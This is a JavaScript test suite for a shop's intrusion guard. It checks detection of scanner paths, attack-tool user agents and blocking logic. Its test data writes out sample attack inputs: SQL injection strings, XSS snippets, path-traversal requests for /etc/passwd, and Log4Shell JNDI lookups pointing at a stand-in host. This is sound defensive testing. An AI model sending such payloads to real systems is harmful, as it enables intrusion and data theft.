import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { DatabaseSync } from "node:sqlite";
import { fileURLToPath } from "node:url";
import { bekannterBot, waechterPruefen } from "./waechter-regeln.js";
import {
  anschlussHash, handleWaechterAdmin, uaKurz, waechterGesperrt, waechterIntern, waechterPflegen, waechterSpeicherLeeren, waechterText, waechterVorfall,
} from "./waechter.js";
import edge, { waechterMerkerLeeren } from "./storefront-edge.js";
import workerEntry from "./worker-entry.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const T0 = Date.parse("2026-10-28T10:00:00Z");
const IP = "198.51.100.66";
const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36";
const ADMIN = "https://admin.disorder119.com";

function d1() {
  const raw = new DatabaseSync(":memory:");
  const files = [path.join(HERE, "schema.sql"), ...fs.readdirSync(path.join(HERE, "migrations")).filter(f => /^\d{4}_.*\.sql$/.test(f)).sort().map(f => path.join(HERE, "migrations", f))];
  for (const file of files) raw.exec(fs.readFileSync(file, "utf8"));
  const statement = (sql, args = []) => ({
    bind: (...next) => statement(sql, next.map(v => (v === undefined ? null : v))),
    first: async () => { const row = raw.prepare(sql).get(...args); return row ? { ...row } : null; },
    all: async () => ({ results: raw.prepare(sql).all(...args).map(row => ({ ...row })) }),
    run: async () => { const r = raw.prepare(sql).run(...args); return { meta: { changes: Number(r.changes), last_row_id: Number(r.lastInsertRowid) } }; },
  });
  return { raw, prepare: sql => statement(sql) };
}

function telegramFangen(antwort = () => ({ ok: true, result: { message_id: 1 } })) {
  const nachrichten = [];
  const original = globalThis.fetch;
  globalThis.fetch = async (input, init = {}) => {
    const url = String(input?.url || input);
    if (url.startsWith("https://api.telegram.org/")) { nachrichten.push(JSON.parse(init.body).text); return new Response(JSON.stringify(antwort()), { status: 200 }); }
    throw new Error(`unerwarteter fetch: ${url}`);
  };
  return { nachrichten, zurueck: () => { globalThis.fetch = original; } };
}

test.beforeEach(() => { waechterSpeicherLeeren(); waechterMerkerLeeren(); });

const envMit = (db, extra = {}) => ({ DB: db, TELEGRAM_BOT_TOKEN: "t", TELEGRAM_CHAT_ID: "42", ...extra });

test("Regeln erkennen Scanner, Angriffsproben und Werkzeuge", () => {
  const u = p => new URL(`https://disorder119.com${p}`);
  for (const p of ["/wp-admin/", "/wp-login.php", "/xmlrpc.php", "/.env", "/.git/config", "/phpmyadmin/", "/admin.php", "/cgi-bin/test", "/index.php", "/vendor/phpunit/x", "/server-status", "/actuator/health", "/.aws/credentials", "/assets/%2e%2e/%2e%2e/etc/passwd", "/blog/wp-includes/x"]) {
    assert.equal(waechterPruefen(u(p))?.art, "probe", p);
  }
  for (const [p, grund] of [
    ["/?id=1%27%20OR%20%271%27=%271", "sql-injection"], ["/artikel/1/?q=1 UNION SELECT password FROM users", "sql-injection"],
    ["/?q=<script>alert(1)</script>", "xss"], ["/?r=javascript:alert(1)", "xss"],
    ["/assets/%252e%252e/%252e%252e/etc/passwd", "path-traversal"], ["/?f=../../etc/passwd", "path-traversal"],
    ["/?x=${jndi:ldap://evil/a}", "log4shell"], ["/?x=%24%7Bjndi%3Aldap%3A%2F%2Fe%7D", "log4shell"],
  ]) assert.deepEqual([waechterPruefen(u(p))?.art, waechterPruefen(u(p))?.grund], ["angriff", grund], p);
  for (const ua of ["sqlmap/1.7.2#stable", "Mozilla/5.0 (compatible; Nuclei)", "Nikto/2.5", "gobuster/3.6", "WPScan v3.8", "masscan/1.3", "zgrab/0.x", "DirBuster-1.0"]) {
    assert.equal(waechterPruefen(u("/"), ua)?.grund, "angriffs-programm", ua);
  }
  assert.equal(waechterPruefen(u("/"), "${jndi:ldap://x/a}")?.grund, "log4shell");
  // Normale Shop-Adressen bleiben unberuehrt.
  for (const p of ["/", "/en/", "/artikel/238/", "/kasse/?artikel=238", "/?utm_source=instagram&utm_campaign=herbst&fbclid=abc", "/assets/app.js?v=c038488e1f",
    "/.well-known/apple-developer-merchantid-domain-association", "/datenschutz/", "/universe/", "/data/catalog.json", "/feed/google-merchant.xml",
    "/adresse/vorschlag?plz=63739&strasse=Hauptstra%C3%9Fe", "/artikel/12/?from=archive", "/fr/agb/"]) {
    assert.equal(waechterPruefen(u(p), CHROME), null, p);
  }
});

test("Bekannte Bots werden nie gesperrt", () => {
  for (const ua of ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; bingbot/2.0)", "facebookexternalhit/1.1", "PayPal/AUHD-214.0-58237765"]) {
    assert.equal(bekannterBot({}, ua), true, ua);
  }
  assert.equal(bekannterBot({ cf: { botManagement: { verifiedBot: true } } }, "x"), true);
  assert.equal(bekannterBot({}, CHROME), false);
});

test("Angriff sperrt sofort fuer 24 h - nur Hash, keine IP, Telegram einmal pro Stunde", async () => {
  const db = d1(), tg = telegramFangen();
  try {
    const env = envMit(db);
    const r = await waechterVorfall(env, null, { ip: IP, ua: "sqlmap/1.7.2#stable (https://sqlmap.org)", land: "CN", pfad: "/?id=1' OR '1'='1", art: "angriff", grund: "sql-injection" }, T0);
    assert.equal(r.gesperrt, true);
    assert.equal(await waechterGesperrt(env, IP, T0 + 60_000), true);
    assert.equal(await waechterGesperrt(env, "203.0.113.1", T0 + 60_000), false);
    assert.equal(await waechterGesperrt(env, IP, T0 + 24 * 3_600_000 + 1000), false, "nach 24 h frei");
    const alles = JSON.stringify([...db.raw.prepare("SELECT * FROM waechter_sperren").all(), ...db.raw.prepare("SELECT * FROM waechter_vorfaelle").all()]);
    assert.ok(!alles.includes(IP), "keine IP in der Datenbank");
    assert.equal(db.raw.prepare("SELECT anschluss FROM waechter_sperren").get().anschluss, await anschlussHash(env, IP));
    assert.equal(tg.nachrichten.length, 1);
    assert.match(tg.nachrichten[0], /SICHERHEIT: verdächtiger Besucher gesperrt/);
    assert.match(tg.nachrichten[0], /China/);
    assert.match(tg.nachrichten[0], /sqlmap\/1\.7\.2/);
    assert.match(tg.nachrichten[0], /SQL-Injection: \/\?id=1' OR '1'='1/);
    assert.match(tg.nachrichten[0], /Versuch/);
    assert.ok(!tg.nachrichten[0].includes(IP), "keine IP in Telegram");
    // Weitere Versuche in derselben Stunde: keine zweite Nachricht, Anzahl steigt.
    await waechterVorfall(env, null, { ip: IP, ua: "sqlmap", land: "CN", pfad: "/?q=<script>", art: "angriff", grund: "xss" }, T0 + 10 * 60_000);
    assert.equal(tg.nachrichten.length, 1);
    assert.ok(db.raw.prepare("SELECT versuche FROM waechter_sperren").get().versuche >= 2);
    await waechterVorfall(env, null, { ip: IP, ua: "sqlmap", land: "CN", pfad: "/x.php", art: "angriff", grund: "sql-injection" }, T0 + 61 * 60_000);
    assert.equal(tg.nachrichten.length, 2, "nach einer Stunde wieder eine Nachricht");
  } finally { tg.zurueck(); }
});

test("Scanner-Pfade, 404-Fluten und Anfrage-Fluten sperren erst ab der Schwelle", async () => {
  const db = d1(), tg = telegramFangen();
  try {
    const env = envMit(db);
    const vorfall = (art, i, ip = IP, grund = "") => waechterVorfall(env, null, { ip, ua: CHROME, land: "NL", pfad: `/x${i}`, art, grund }, T0 + i * 1000);
    assert.equal((await vorfall("probe", 1)).gesperrt, false);
    assert.equal((await vorfall("probe", 2)).gesperrt, false, "zwei Scanner-Pfade (z. B. eigener Sicherheitstest) sperren nicht");
    assert.equal((await vorfall("probe", 3)).gesperrt, true);
    for (let i = 1; i < 20; i++) assert.equal((await vorfall("404", i, "192.0.2.10")).gesperrt, false);
    assert.equal((await vorfall("404", 20, "192.0.2.10")).gesperrt, true);
    assert.equal(db.raw.prepare("SELECT grund FROM waechter_sperren ORDER BY id DESC").get().grund, "zu-viele-404");
    assert.equal((await vorfall("flut", 1, "192.0.2.20")).gesperrt, false);
    assert.equal((await vorfall("flut", 2, "192.0.2.20")).gesperrt, false);
    assert.equal((await vorfall("flut", 3, "192.0.2.20")).gesperrt, true);
    // Bots und Unsinn zaehlen nicht.
    assert.equal((await waechterVorfall(env, null, { ip: "192.0.2.30", art: "angriff", grund: "xss", bot: true }, T0)).gesperrt, false);
    assert.equal((await waechterVorfall(env, null, { ip: "192.0.2.30", art: "quatsch" }, T0)).gesperrt, false);
    assert.equal((await waechterVorfall(envMit(db, { WAECHTER: "aus" }), null, { ip: "192.0.2.31", art: "angriff", grund: "xss" }, T0)).gesperrt, false);
  } finally { tg.zurueck(); }
});

test("Angriffswelle: wenige Einzelmeldungen, der Rest als Sammelmeldung im Cron", async () => {
  const db = d1(), tg = telegramFangen();
  try {
    const env = envMit(db, { WAECHTER_TELEGRAM_EINZELN: "2" });
    for (let i = 0; i < 6; i++) await waechterVorfall(env, null, { ip: `192.0.2.${100 + i}`, ua: "nuclei", land: i % 2 ? "CN" : "VN", pfad: "/.env", art: "angriff", grund: "angriffs-programm" }, T0 + i * 1000);
    assert.equal(tg.nachrichten.length, 2);
    const ergebnis = await waechterPflegen(env, T0 + 5 * 60_000);
    assert.equal(ergebnis.gesammelt, 4);
    assert.equal(tg.nachrichten.length, 3);
    assert.match(tg.nachrichten[2], /Angriffswelle – 4 Anschlüsse/);
    assert.match(tg.nachrichten[2], /Vietnam|China/);
    assert.equal((await waechterPflegen(env, T0 + 6 * 60_000)).gesammelt, 0, "nicht doppelt");
    // Aufraeumen: Vorfaelle nach 24 h, Sperren 7 Tage nach Ablauf.
    await waechterPflegen(env, T0 + 9 * 24 * 3_600_000);
    assert.equal(db.raw.prepare("SELECT COUNT(*) n FROM waechter_vorfaelle").get().n, 0);
    assert.equal(db.raw.prepare("SELECT COUNT(*) n FROM waechter_sperren").get().n, 0);
  } finally { tg.zurueck(); }
});

test("Admin: Liste der Sperren nur angemeldet, Aufheben nur als Inhaber", async () => {
  const db = d1(), tg = telegramFangen();
  try {
    const env = envMit(db);
    await waechterVorfall(env, null, { ip: IP, ua: CHROME, land: "RU", pfad: "/wp-login.php", art: "angriff", grund: "log4shell" }, T0);
    const req = (pfad, init = {}) => new Request(`https://api.disorder119.com${pfad}`, { ...init, headers: { Origin: ADMIN, ...(init.headers || {}) } });
    assert.equal((await handleWaechterAdmin(req("/admin/besucher/sicherheit"), env, new URL("https://api.disorder119.com/admin/besucher/sicherheit"), T0)).status, 401);
    const leser = { ...env, ADMIN_AUTH_CONTEXT: { role: "READER" } };
    const res = await handleWaechterAdmin(req("/admin/besucher/sicherheit"), leser, new URL("https://api.disorder119.com/admin/besucher/sicherheit"), T0 + 1000);
    assert.equal(res.status, 200);
    assert.equal(res.headers.get("Access-Control-Allow-Origin"), ADMIN);
    const daten = await res.json();
    assert.equal(daten.aktiveSperren, 1);
    assert.equal(daten.sperren[0].landName, "Russland");
    assert.equal(daten.sperren[0].grundText, "Log4Shell-Versuch");
    assert.equal(daten.sperren[0].aktiv, true);
    assert.deepEqual(daten.laender.map(l => l.land), ["RU"]);
    assert.ok(!JSON.stringify(daten).includes(IP) && !JSON.stringify(daten).includes(await anschlussHash(env, IP)), "weder IP noch Hash im Admin");
    const aufheben = rolle => handleWaechterAdmin(req("/admin/besucher/sicherheit/aufheben", { method: "POST", body: JSON.stringify({ id: daten.sperren[0].id }) }),
      { ...env, ADMIN_AUTH_CONTEXT: { role: rolle } }, new URL("https://api.disorder119.com/admin/besucher/sicherheit/aufheben"), T0 + 2000);
    assert.equal((await aufheben("READER")).status, 403);
    assert.equal(await waechterGesperrt(env, IP, T0 + 3000), true);
    assert.equal((await aufheben("OWNER")).status, 200);
    assert.equal(await waechterGesperrt(env, IP, T0 + 3000), false);
    // Nach dem Aufheben sperrt nicht schon der naechste einzelne Scanner-Pfad.
    assert.equal((await waechterVorfall(env, null, { ip: IP, ua: CHROME, art: "probe", grund: "scanner-pfad" }, T0 + 4000)).gesperrt, false);
  } finally { tg.zurueck(); }
});

test("Storefront: Proben sofort 404/403, gesperrte Anschluesse 403 (Bilder bleiben frei), Flut 429", async () => {
  waechterMerkerLeeren();
  const gesendet = [], laeuft = [];
  let gesperrt = false;
  const env = { BESUCH: { fetch: async (url, init) => {
    gesendet.push({ url, body: JSON.parse(init.body) });
    if (url.endsWith("/pruefen")) return new Response(JSON.stringify({ gesperrt }), { status: 200 });
    return new Response(null, { status: 204 });
  } } };
  const ctx = { waitUntil: p => laeuft.push(p) };
  let ursprung = 0;
  const origin = async () => { ursprung++; return new Response("<p>ok</p>", { headers: { "Content-Type": "text/html" } }); };
  const anfrage = (p, ua = CHROME, ip = IP) => new Request(`https://disorder119.com${p}`, { headers: { "User-Agent": ua, "CF-Connecting-IP": ip } });

  let res = await edge.fetch(anfrage("/wp-login.php"), env, ctx, origin);
  assert.equal(res.status, 404);
  res = await edge.fetch(anfrage("/?id=1%20UNION%20SELECT%201"), env, ctx, origin);
  assert.equal(res.status, 403);
  await Promise.all(laeuft);
  const vorfaelle = gesendet.filter(g => g.url.endsWith("/intern/waechter/vorfall")).map(g => g.body);
  assert.deepEqual(vorfaelle.map(v => [v.art, v.grund]), [["probe", "scanner-pfad"], ["angriff", "sql-injection"]]);
  assert.equal(vorfaelle[0].ip, IP, "die IP geht nur ueber die interne Dienstbindung an den Shop-Worker");
  assert.equal(ursprung, 0);

  // Googlebot folgt einem Spam-Link: 404, aber als Bot gekennzeichnet (keine Sperre).
  await edge.fetch(anfrage("/wp-login.php", "Mozilla/5.0 (compatible; Googlebot/2.1)", "66.249.66.1"), env, ctx, origin);
  await Promise.all(laeuft);
  assert.equal(gesendet.filter(g => g.url.endsWith("/vorfall")).at(-1).body.bot, true);

  // Gesperrt: Seiten 403, Bilder/Skripte weiter erreichbar.
  waechterMerkerLeeren();
  gesperrt = true;
  res = await edge.fetch(anfrage("/"), env, ctx, origin);
  assert.equal(res.status, 403);
  assert.match(await res.text(), /vorübergehend gesperrt/);
  res = await edge.fetch(anfrage("/assets/app.js"), env, ctx, async () => new Response("js", { headers: { "Content-Type": "text/javascript" } }));
  assert.equal(res.status, 200);
  // Antwort wird eine Minute gemerkt.
  const vorher = gesendet.filter(g => g.url.endsWith("/pruefen")).length;
  await edge.fetch(anfrage("/kasse/"), env, ctx, origin);
  assert.equal(gesendet.filter(g => g.url.endsWith("/pruefen")).length, vorher);

  // Flut: Limiter sagt nein -> 429 und Meldung.
  waechterMerkerLeeren();
  gesperrt = false;
  const flut = { ...env, WAECHTER_FLUT: { limit: async () => ({ success: false }) } };
  res = await edge.fetch(anfrage("/", CHROME, "192.0.2.77"), flut, ctx, origin);
  assert.equal(res.status, 429);
  await Promise.all(laeuft);
  assert.equal(gesendet.filter(g => g.url.endsWith("/vorfall")).at(-1).body.art, "flut");

  // Pruefung faellt aus: Seite bleibt erreichbar.
  waechterMerkerLeeren();
  const kaputt = { BESUCH: { fetch: async () => { throw new Error("weg"); } } };
  res = await edge.fetch(anfrage("/", CHROME, "192.0.2.78"), kaputt, ctx, origin);
  assert.equal(res.status, 200);
});

test("Shop-API: Probe, Sperre, Ausnahmen fuer Webhooks und Admin", async () => {
  const db = d1(), tg = telegramFangen();
  try {
    const env = envMit(db);
    const ctx = { waitUntil() {} };
    const anfrage = (p, init = {}) => new Request(`https://api.disorder119.com${p}`, { ...init, headers: { "User-Agent": CHROME, "CF-Connecting-IP": IP, ...(init.headers || {}) } });
    let res = await workerEntry.fetch(anfrage("/.env"), env, ctx);
    assert.equal(res.status, 404);
    res = await workerEntry.fetch(anfrage("/versand/optionen?x=${jndi:ldap://e/a}"), env, ctx);
    assert.equal(res.status, 403);
    await new Promise(r => setTimeout(r, 20));
    assert.equal(await waechterGesperrt(env, IP), true);
    res = await workerEntry.fetch(anfrage("/versand/optionen"), env, ctx);
    assert.equal(res.status, 403);
    assert.equal((await res.json()).error, "BLOCKED");
    // PayPal-Webhook und Admin-Routen sind ausgenommen (nicht 403 BLOCKED).
    res = await workerEntry.fetch(anfrage("/paypal-webhook", { method: "POST", body: "{}" }), env, ctx);
    assert.notEqual((await res.json().catch(() => ({}))).error, "BLOCKED");
    res = await workerEntry.fetch(anfrage("/admin/besucher/sicherheit"), env, ctx);
    assert.notEqual((await res.json().catch(() => ({}))).error, "BLOCKED");
    // Interne Dienstbindung: Vorfall und Pruefung.
    const intern = (p, body) => waechterIntern(new Request(`https://storefront.intern${p}`, { method: "POST", body: JSON.stringify(body) }), env, ctx, new URL(`https://storefront.intern${p}`));
    assert.deepEqual(await (await intern("/intern/waechter/pruefen", { ip: IP })).json(), { gesperrt: true });
    assert.deepEqual(await (await intern("/intern/waechter/pruefen", { ip: "203.0.113.200" })).json(), { gesperrt: false });
    assert.equal((await (await intern("/intern/waechter/vorfall", { ip: "203.0.113.201", ua: "nikto", art: "angriff", grund: "angriffs-programm", land: "DE" })).json()).gesperrt, true);
  } finally { tg.zurueck(); }
});

test("Kurzform der Browserkennung und Nachrichtentext ohne IP", () => {
  assert.equal(uaKurz("sqlmap/1.7.2#stable (https://sqlmap.org)"), "sqlmap/1.7.2");
  assert.equal(uaKurz(CHROME), "Windows-PC · Chrome");
  assert.equal(uaKurz("python-requests/2.31.0"), "python-requests/2.31.0");
  assert.equal(uaKurz(""), "ohne Browserkennung");
  const text = waechterText({ land: "IN", ua_kurz: "nuclei", grund: "scanner-pfad", beispiel: "/wp-login.php", versuche: 7, bis: new Date(T0).toISOString() });
  assert.match(text, /Indien/);
  assert.match(text, /7 Versuche/);
  assert.match(text, /Scanner-Pfade/);
});

test("Ohne Migration 0041 oder Pfeffer arbeitet der Shop weiter", async () => {
  const leer = { prepare: () => ({ bind: () => ({ first: async () => { throw new Error("no such table: waechter_sperren"); }, run: async () => { throw new Error("no such table: waechter_vorfaelle"); }, all: async () => ({ results: [] }) }) }) };
  assert.equal(await waechterGesperrt({ DB: leer }, IP), false);
  assert.deepEqual(await waechterVorfall({ DB: leer }, null, { ip: IP, art: "angriff", grund: "xss" }), { gesperrt: false });
  // Livebetrieb ohne LOGIN_IP_PEPPER: kein Hash, keine Sperre, kein Absturz.
  assert.deepEqual(await waechterVorfall({ DB: d1(), PAYPAL_ENVIRONMENT: "live" }, null, { ip: IP, art: "angriff", grund: "xss" }), { gesperrt: false });
});

test("Gesperrter Angreifer erzeugt hoechstens eine Schreibung je Minute, die Sperre laeuft ab dem letzten Versuch weiter", async () => {
  const db = d1(), tg = telegramFangen();
  try {
    const env = envMit(db);
    await waechterVorfall(env, null, { ip: IP, ua: "nikto", land: "CN", pfad: "/", art: "angriff", grund: "angriffs-programm" }, T0);
    let schreibungen = 0;
    const zaehlendeDb = { prepare: sql => { const st = db.prepare(sql); if (/^\s*(UPDATE|INSERT|DELETE)/i.test(sql)) { const bind = st.bind; return { ...st, bind: (...a) => { const b = bind(...a); return { ...b, run: async () => { schreibungen++; return b.run(); } }; } }; } return st; } };
    const env2 = { ...env, DB: zaehlendeDb };
    for (let i = 1; i <= 200; i++) await waechterVorfall(env2, null, { ip: IP, ua: "nikto", art: "angriff", grund: "xss" }, T0 + 1000 + i * 100);
    for (let i = 1; i <= 200; i++) assert.equal(await waechterGesperrt(env2, IP, T0 + 1000 + i * 100), true);
    assert.ok(schreibungen <= 3, `nur ${schreibungen} Schreibungen fuer 400 Versuche`);
    assert.equal(db.raw.prepare("SELECT COUNT(*) n FROM waechter_vorfaelle").get().n, 1, "keine neuen Vorfall-Zeilen waehrend der Sperre");
    // Weiter angreifen nach 23 h: Sperre verlaengert sich.
    await waechterVorfall(env, null, { ip: IP, ua: "nikto", art: "angriff", grund: "xss" }, T0 + 23 * 3_600_000);
    assert.equal(await waechterGesperrt(env, IP, T0 + 30 * 3_600_000), true);
  } finally { tg.zurueck(); }
});

test("Abrufe anderer Cloudflare-Worker ohne Browserkennung (Testshop) werden nie gesperrt", async () => {
  const gesendet = [], laeuft = [];
  const env = { BESUCH: { fetch: async (url, init) => { gesendet.push({ url, body: JSON.parse(init.body) }); return new Response(JSON.stringify({ gesperrt: true }), { status: 200 }); } } };
  const ctx = { waitUntil: p => laeuft.push(p) };
  const anfrage = p => { const r = new Request(`https://disorder119.com${p}`, { headers: { "CF-Connecting-IP": "2a06:98c0:3600::103" } }); Object.defineProperty(r, "cf", { value: { asn: 13335, country: "DE" } }); return r; };
  const origin = async () => new Response("<p>ok</p>", { headers: { "Content-Type": "text/html" } });
  assert.equal((await edge.fetch(anfrage("/"), env, ctx, origin)).status, 200, "keine Sperrabfrage, keine Sperre");
  assert.equal((await edge.fetch(anfrage("/wp-login.php"), env, ctx, origin)).status, 404);
  assert.equal((await edge.fetch(anfrage("/gibtsnicht/"), env, ctx, origin)).status, 404);
  await Promise.all(laeuft);
  assert.equal(gesendet.filter(g => g.url.endsWith("/pruefen")).length, 0);
  const vorfaelle = gesendet.filter(g => g.url.endsWith("/vorfall"));
  assert.deepEqual(vorfaelle.map(v => [v.body.art, v.body.bot]), [["probe", true]], "Probe nur als Bot gemeldet, 404 gar nicht");
});
